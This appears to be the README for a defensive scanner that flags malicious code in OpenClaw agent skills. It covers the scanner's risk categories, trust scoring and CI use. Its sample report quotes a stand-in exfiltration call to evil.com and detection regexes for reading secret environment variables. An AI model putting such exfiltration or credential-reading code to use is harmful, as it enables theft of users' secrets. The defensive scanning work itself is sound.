# 🔍 OpenClaw Skill Security Scanner

**Protect yourself from malicious OpenClaw skills**

After 341 malicious skills were discovered on ClawHub, the community needed a way to scan skills before installation. This tool detects dangerous patterns in skill code and provides a trust score.

## 🚀 Quick Start

### Installation

```bash
npm install -g @openclaw/skill-scanner
```

### Scan a Skill

```bash
# Scan local directory
skill-scanner ./my-skill

# Scan GitHub repository
skill-scanner https://github.com/user/skill-name

# Output JSON
skill-scanner ./my-skill --json --output results.json
```

## 🎯 Features

### CLI Scanner
- ✅ Scans local directories or GitHub repos
- ✅ Detects 8+ categories of malicious patterns
- ✅ Provides 0-100 trust score
- ✅ Color-coded risk levels
- ✅ Detailed findings with examples
- ✅ JSON export support
- ✅ Exit codes for CI/CD integration

### Web Interface
- ✅ Paste code directly in browser
- ✅ Real-time scanning
- ✅ Beautiful dark UI
- ✅ No backend required
- ✅ Deploy as static site

### Detection Capabilities

| Category | Severity | What It Catches |
|----------|----------|-----------------|
| 🚨 Data Exfiltration | CRITICAL | Unauthorized network requests |
| 🔐 Credential Theft | CRITICAL | Reading passwords, keys, tokens |
| 💣 System Commands | CRITICAL | Destructive commands (rm -rf, etc) |
| ⚡ Dangerous Exec | HIGH | eval(), spawn() with user input |
| 🎭 Code Obfuscation | HIGH | base64, hex encoding, eval(atob()) |
| 🌐 Suspicious Domains | HIGH | Free TLDs, raw IP addresses |
| 📝 Prompt Injection | MEDIUM | Attempts to override AI instructions |
| 📁 File Access | MEDIUM | Writing to sensitive directories |

## 📊 Risk Scoring

- **80-100** 🟢 LOW RISK - Safe to use
- **60-79** 🟡 MEDIUM RISK - Review before using
- **40-59** 🟠 HIGH RISK - Only if you trust the source
- **0-39** 🔴 CRITICAL - DO NOT INSTALL

## 🖥️ Web Interface

Open `web/index.html` in any browser or serve it:

```bash
cd web
python3 -m http.server 8080
```

Visit `http://localhost:8080` and paste skill code directly!

## 🔧 Programmatic Usage

```javascript
const SkillScanner = require('@openclaw/skill-scanner');

const scanner = new SkillScanner();
const results = scanner.scanDirectory('./suspicious-skill');

if (results.riskLevel === 'CRITICAL') {
  console.error('🛑 DO NOT INSTALL - Critical security risks detected!');
  process.exit(1);
}

console.log(`Trust Score: ${results.overallScore}/100`);
console.log(`Findings: ${results.totalFindings}`);
```

## 📖 Examples

### Example 1: Safe Skill
```bash
$ skill-scanner ./weather-skill

═══════════════════════════════════════════════
   OpenClaw Skill Security Scanner Report
═══════════════════════════════════════════════

📂 Path: ./weather-skill
🎯 Overall Score: 100/100
⚠️  Risk Level: LOW
📊 Total Findings: 0
📄 Files Scanned: 3

✅ No security issues detected!
```

### Example 2: Malicious Skill
```bash
$ skill-scanner ./sus-skill

═══════════════════════════════════════════════
   OpenClaw Skill Security Scanner Report
═══════════════════════════════════════════════

📂 Path: ./sus-skill
🎯 Overall Score: 20/100
⚠️  Risk Level: CRITICAL
📊 Total Findings: 5
📄 Files Scanned: 2

═══════════════════════════════════════════════
   Detailed Findings
═══════════════════════════════════════════════

📄 index.js (Score: 20/100)
─────────────────────────────────────────────
  • CRITICAL: exfiltration
    Pattern: fetch\s*\(\s*['"`]https?:\/\/(?!.*(localhost...
    Matches: 2
    Example: fetch('https://evil.com/steal', {method: 'POST'})...
    Score Impact: -30

  • CRITICAL: credentials
    Pattern: process\.env\.(PASSWORD|SECRET|KEY|TOKEN|API_KEY)
    Matches: 1
    Example: process.env.API_KEY...
    Score Impact: -30
```

## 🛡️ CI/CD Integration

Use exit codes to block malicious skills:

```yaml
# GitHub Actions
- name: Scan Skill
  run: skill-scanner . || exit 1
```

Exit codes:
- `0` = Safe (LOW/MEDIUM)
- `1` = HIGH risk
- `2` = CRITICAL risk

## ⚠️ Limitations

This scanner uses pattern matching and heuristics:

- ✅ Fast and lightweight
- ✅ Catches common attack patterns
- ❌ May produce false positives
- ❌ Cannot catch all sophisticated attacks

**Always review code from untrusted sources manually!**

## 🤝 Contributing

Found a malicious pattern we missed? Open an issue or PR:
https://github.com/damediacoadmin/skill-scanner

## 📜 License

MIT License - Free to use, modify, and distribute

## 🙏 Acknowledgments

Built for the OpenClaw community. Stay safe out there! 🔍

---

**Remember: Trust, but verify. Scan first, install later.**
